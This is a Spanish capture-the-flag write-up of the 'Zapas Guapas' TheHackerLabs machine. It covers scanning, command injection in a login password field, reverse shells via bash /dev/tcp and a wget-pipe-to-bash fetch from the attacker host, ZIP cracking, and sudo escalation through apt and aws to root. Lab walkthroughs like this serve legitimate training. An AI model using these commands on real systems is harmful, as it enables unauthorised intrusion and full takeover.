---
title: "Zapas Guapas - TheHackerLabs"
date: 2025-02-18
draft: false
slug: "THL-writeup-zapasguapas"
excerpt: "Fue una máquina sencilla que requiere un poquito de trabajo. Al descubrir solamente dos puertos abiertos, nos vamos a analizar la página web activa en el puerto 80. Al no encontrar mucho, aplicamos Fuzzing con lo que descubrimos una página que sirve como login. Dicha página, permite la ejecución de comandos desde el campo contraseña que aprovechamos usando BurpSuite para obtener una Reverse Shell. Dentro de la máquina, ubicamos y descargamos un archivo ZIP que logramos crackear, siendo que contiene la contraseña de un usuario de la máquina víctima. Convirtiéndonos en ese usuario, descubrimos que tiene privilegios para usar el comando apt de otro usuario de la máquina. Utilizando GTFOBins, logramos obtener una sesión como el segundo usuario de la máquina. Por último, dicho usuario también tiene privilegios sobre el binario aws del usuario Root que, de igual forma, logramos escalar privilegios usando GTFOBins y nos convertimos en Root."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "PHP", "Remote Command Execution (RCE)", "Command Injection", "Cracking Hash", "Cracking ZIP", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "bash"
  - "nc"
  - "python3"
  - "BurpSuite"
  - "wget"
  - "cat"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "exec"
  - "apt"
  - "aws"
links:
  - "https://gtfobins.github.io/gtfobins/apt/"
  - "https://gtfobins.github.io/gtfobins/aws/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-zapasguapas/zapasguapas.webp"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.110
PING 192.168.1.110 (192.168.1.110) 56(84) bytes of data.
64 bytes from 192.168.1.110: icmp_seq=1 ttl=64 time=0.815 ms
64 bytes from 192.168.1.110: icmp_seq=2 ttl=64 time=0.872 ms
64 bytes from 192.168.1.110: icmp_seq=3 ttl=64 time=0.939 ms
64 bytes from 192.168.1.110: icmp_seq=4 ttl=64 time=0.802 ms

--- 192.168.1.110 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 0.802/0.857/0.939/0.054 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.110 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 13:15 CST
Initiating ARP Ping Scan at 13:15
Scanning 192.168.1.110 [1 port]
Completed ARP Ping Scan at 13:15, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:15
Scanning 192.168.1.110 [65535 ports]
Discovered open port 80/tcp on 192.168.1.110
Discovered open port 22/tcp on 192.168.1.110
Completed SYN Stealth Scan at 13:16, 56.86s elapsed (65535 total ports)
Nmap scan report for 192.168.1.110
Host is up, received arp-response (0.00072s latency).
Scanned at 2025-02-18 13:15:37 CST for 57s
Not shown: 52942 filtered tcp ports (no-response), 12591 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 57.07 seconds
           Raw packets sent: 124720 (5.488MB) | Rcvd: 12596 (503.844KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solamente hay dos puertos abiertos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.110 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 13:17 CST
Nmap scan report for 192.168.1.110
Host is up (0.00075s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 7e:42:d0:d4:c9:36:f4:f8:e6:77:c2:c6:7e:25:dc:ff (ECDSA)
|_  256 6f:a0:50:44:9f:a2:fb:99:40:f3:90:af:56:cc:34:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Zapasguapas
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Me da la impresión de que la intrusión será por la página web activa.

Vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura1.png">
</p>

Parece una página de venta de tenis.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura2.png">
</p>

Aparecen varías tecnologías, entre ellas **PHP**, que ya nos da una idea de por donde será la intrusión.

Navegando un poco, logre ver 2 usuarios:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura3.png">
</p>

Quizá nos sirvan para más adelante.

También podemos ver un correo de contacto:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura4.png">
</p>

Quizá sea un dominio.

Si le damos al botón de **Contacto**, podemos ver una página en la que podemos introducir datos, pero estos no se envían ni nada:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura5.png">
</p>

Por lo demás, no encontré algo que sea de interés.

Entonces, vamos a aplicar **Fuzzing** para ver con que nos podemos encontrar.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php-sh-cgi-html http://192.168.1.110/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.110/FUZZ.FUZ2Z
Total requests: 1102725

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000005:   200        273 L    809 W      14085 Ch    "index - html"                                                                                                               
000000055:   200        157 L    426 W      7694 Ch     "contact - html"                                                                                                             
000000060:   200        177 L    474 W      8764 Ch     "about - html"                                                                                                               
000000195:   200        49 L     163 W      2090 Ch     "login - html"                                                                                                               
000142437:   200        77 L     223 W      2357 Ch     "nike - php"                                                                                                                 
000060230:   200        172 L    463 W      8587 Ch     "testimonial - html"                                                                                                         
000226130:   403        9 L      28 W       279 Ch      "html"                                                                                                                       
000226127:   403        9 L      28 W       279 Ch      "php"                                                                                                                        

Total time: 1635.029
Processed Requests: 1102725
Filtered Requests: 1102717
Requests/sec.: 674.4373
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una lista de archivos con extensiones a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.110/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php,cgi,sh,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.110/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,cgi,sh,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 14085]
/contact.html         (Status: 200) [Size: 7694]
/images               (Status: 301) [Size: 317] [--> http://192.168.1.110/images/]
/about.html           (Status: 200) [Size: 8764]
/login.html           (Status: 200) [Size: 2090]
/bin                  (Status: 301) [Size: 314] [--> http://192.168.1.110/bin/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.1.110/css/]
/lib                  (Status: 301) [Size: 314] [--> http://192.168.1.110/lib/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.1.110/js/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.1.110/javascript/]
/include              (Status: 301) [Size: 318] [--> http://192.168.1.110/include/]
/testimonial.html     (Status: 200) [Size: 8587]
/nike.php             (Status: 200) [Size: 2362]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1323270 / 1323276 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar extensiones especificas a buscar. |

Hay dos páginas que me llaman la atención, siendo 

Hay varias cosillas que me interesan, pero la que me llama más la atención es la página `login.html`.

Vamos a verla.

### Analizando Página login.html {#Login}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura6.png">
</p>

Parece un login simple, pero cuando metemos una credencial y la enviamos, no pasa nada.

Vamos a capturar la petición que se está realizando con **BurpSuite** y la mandamos al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura7.png">
</p>

Ojito con la petición que se está realizando, pues parece que es un **archivo PHP** llamado `run_command.php`, que se ejecuta cuando utilizamos la página `login.html`. Además, utiliza dos parámetros que son el usuario y la contraseña.

Creo que ya con el nombre del **archivo PHP** nos damos cuenta de lo que podemos hacer y si no, tan solo tenemos que ver el código fuente de la página `login.html`:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura8.png">
</p>

Entonces, el campo **contraseña** sirve para ejecutar comandos.

Pongámoslo a prueba intentando ejecutar el comando **whoami**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura9.png">
</p>

Funciona, pero no me gusta que no podamos ver lo que escribimos, por lo que creo que es mejor usar **BurpSuite** para más comodidad.

Igual puedes ejecutar comandos desde ahí:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura10.png">
</p>

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Reverse Shell en Página loing.html y Conectandonos a la Máquina Víctima {#RevShell}

Podemos hacerlo de dos formas: usando nuestro oneliner desde **BurpSuite** o un ejecutando un archivo **HTML o sh**.

Haremos ambas.

#### Obteniendo Reverse Shell Utilizando oneliner desde BurpSuite {#RevShell1}

Vamos a usar nuestra **Reverse Shell** de confianza que siempre ocupamos, pero URL encodeada:
```bash
# Forma normal
bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"
bash -i >& /dev/tcp/Tu_IP/443 0>&1

# URL encodeada
bash -c "bash -i >%26 /dev/tcp/Tu_IP/443 0>%261"
```

Pero al usarla en **BurpSuite**, debemos cambiar los espacios por el signo **+**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura11.png">
</p>

Abre una **netcat**
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y manda la petición. Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.110] 47544
bash: cannot set terminal process group (511): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zapasguapas:/var/www/tienda$
```
Ya estamos dentro. Recuerda hacer un tratamiento de la **TTY** (aunque para esta máquina eso es opcional).

#### Obteniendo Reverse Shell Ejecutando Archivo sh desde Servidor Remoto {#RevShell2}

Primero comprobamos si la máquina tiene **curl o wget**, siendo que solamente tiene **wget**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura12.png">
</p>

Vamos a guardar la **Reverse Shell** dentro de un archivo al que llamaremos `revShell.sh`:
```bash
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```

Luego, levantamos un servidor con **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y desde **BurpSuite**, vamos a usar **wget** para que ejecute de manera remota nuestra **Reverse Shell**.

Este es el comando:
```bash
wget -qO- http://Tu_IP/revShell.sh | bash
```

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y ejecuta en **BurpSuite** el comando de **wget**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura13.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.110] 41854
bash: cannot set terminal process group (511): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zapasguapas:/var/www/tienda$
```
Estamos dentro de nuevo.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#EnumLin}

Si vemos el archivo `/etc/passwd`, veremos que hay 2 usuarios:
```bash
www-data@zapasguapas:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
...
...
proadidas:x:1001:1001::/home/proadidas:/bin/bash
pronike:x:1002:1002::/home/pronike:/bin/bash
```

Y si vamos al `/home`, ahí estarán:
```bash
www-data@zapasguapas:/home$ ls
proadidas  pronike
```

Si entramos en el directorio del **usuario proadidas**, encontramos la flag del usuario, pero no podremos verla, ya que solo el **usuario Root** puede verla:
```bash
www-data@zapasguapas:/home/proadidas$ ls -la
total 32
drwxr-xr-x 3 proadidas proadidas 4096 Apr 23  2024 .
drwxr-xr-x 4 root      root      4096 Apr 23  2024 ..
lrwxrwxrwx 1 root      root         9 Apr 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 proadidas proadidas  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 proadidas proadidas 3526 Apr 23  2023 .bashrc
-rw------- 1 proadidas proadidas   20 Apr 22  2024 .lesshst
drwxr-xr-x 3 proadidas proadidas 4096 Apr 23  2024 .local
-rw-r--r-- 1 proadidas proadidas  807 Apr 23  2023 .profile
-r-------- 1 root      root        33 Apr 17  2024 user.txt
```

Y si entramos al directorio del **usuario pronike**, encontramos una nota:
```bash
www-data@zapasguapas:/home/pronike$ cat nota.txt 
Creo que proadidas esta detras del robo de mi contraseña
```
Bien, esto ya es una pista.

Navegando un poco más (porque no sé la razón por la que **linpeas.sh** no me funciono), podemos encontrar un **archivo ZIP** dentro del directorio `/opt`:
```bash
www-data@zapasguapas:/opt$ ls
importante.zip
```

Para descargarlo en nuestra máquina, abrimos un servidor con **Python** en el **puerto 8080** y utilizamos **wget** en nuestra máquina para descargarlo:
```bash
wget http://192.168.1.110:8080/importante.zip
--2025-02-18 14:47:53--  http://192.168.1.110:8080/importante.zip
Conectando con 192.168.1.110:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 266 [application/zip]
Grabando a: «importante.zip»
.
importante.zip             100%[=============>]     266  --.-KB/s    en 0s 
.
2025-02-18 14:47:53 (43.7 MB/s) - «importante.zip» guardado [266/266]
.                                                                                                                                                                                             
❯ ls
importante.zip  linpeas.sh revShell.sh
```

Ya lo tenemos, pero el problema es que sí tratamos de descomprimirlo, nos pedirá una contraseña:
```bash
unzip importante.zip
Archive:  importante.zip
[importante.zip] password.txt password:
```

Debemos aplicarle fuerza bruta con **JohnTheRipper**.

### Crackeando Archivo ZIP con JohnTheRipper y Entrando al Servicio SSH {#HashCrack}

Primero tenemos que obtener el hash del **archivo ZIP** y lo haremos con **zip2john**:
```bash
zip2john importante.zip > hashZIP
ver 2.0 efh 5455 efh 7875 importante.zip/password.txt PKZIP Encr: TS_chk, cmplen=76, decmplen=71, crc=9CB8F6B5 ts=4C4E cs=4c4e type=8
```

Y ahora, utilizamos **JohnTheRipper** para crackear ese hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hotstuff         (importante.zip/password.txt)     
1g 0:00:00:00 DONE (2025-02-18 14:48) 25.00g/s 256000p/s 256000c/s 256000C/s 123456..1asshole
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña del **archivo ZIP**.

Al descomprimirlo, nos da un archivo de texto que se llama **password.txt**:
```bash
unzip importante.zip
Archive:  importante.zip
[importante.zip] password.txt password: 
  inflating: password.txt
```

Y resulta ser la contraseña del **usuario pronike** que nos va a permitir entrar al **servicio SSH**:
```bash
ssh pronike@192.168.1.110
pronike@192.168.1.110's password:
Linux zapasguapas 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pronike@zapasguapas:~$
```

### Utilizando Binario apt para Escalar Privilegios y Convertirnos en Usuario proadidas {#binAPT}

Revisando nuestro privilegios como el **usuario pronike**, encontramos lo siguiente:
```bash
pronike@zapasguapas:~$ sudo -l
Matching Defaults entries for pronike on zapasguapas:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pronike may run the following commands on zapasguapas:
    (proadidas) NOPASSWD: /usr/bin/apt
```
Podemos ejecutar el **binario apt** como el **usuario proadidas**.

Si buscamos en **GTFOBins**, podemos encontrar una forma con la que podemos escalar privilegios con este binario:
* <a href="https://gtfobins.github.io/gtfobins/apt/" target="_blank">GFTOBins: apt</a>

Ocuparemos la opción A.

Apliquémoslo:
```bash
pronike@zapasguapas:~$ sudo -u proadidas apt changelog apt
```

Una vez que lo ejecutes, debes indicarle que te dé abra una shell, justo como dice **GTFOBins**:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura14.png">
</p>

Y ya seremos el usuario proadidas:
```bash
$ whoami
proadidas
```

Si quieres que se vea el **prompt**, solamente ejecuta cualquiera de los siguientes comandos:
```bash
# Forma 1
$ /bin/bash -i
proadidas@zapasguapas:/home/pronike$
.
# Forma 2
$ exec bash
proadidas@zapasguapas:/home/pronike$
```

### Escalando Privilegios con Binario aws para Convertirnos en Root {#binAWS}

Si revisamos los privilegios del **usuario proadidas**, podremos usar el comando **aws** como el **usuario Root**:
```bash
proadidas@zapasguapas:/home/pronike$ sudo -l
Matching Defaults entries for proadidas on zapasguapas:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
.
User proadidas may run the following commands on zapasguapas:
    (proadidas) NOPASSWD: /usr/bin/apt
    (root) NOPASSWD: /usr/bin/aws
```

Y de nuevo, buscando en **GTFOBins**, encontramos una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/aws/" target="_blank">GTFOBins: aws</a>

Vamos a aplicarlo:
```bash
proadidas@zapasguapas:/home/pronike$ sudo aws help
```

Una vez que lo ejecutes, aplicamos lo mismo que hicimos antes:

<p align="center">
<img src="/assets/images/THL-writeup-zapasguapas/Captura15.png">
</p>

Y ya seremos el **usuario Root**:
```bash
# whoami
root
# exec bash
root@zapasguapas:/home/pronike# whoami
root
```

Ya solo buscamos las flags:
```bash
root@zapasguapas:/home/pronike# cd ../proadidas
root@zapasguapas:/home/proadidas# ls
user.txt
root@zapasguapas:/home/proadidas# cat user.txt
...
root@zapasguapas:/home/proadidas# cd /root
root@zapasguapas:~# ls
root.txt
root@zapasguapas:~# cat root.txt
...
```
Con esto, terminamos la máquina.
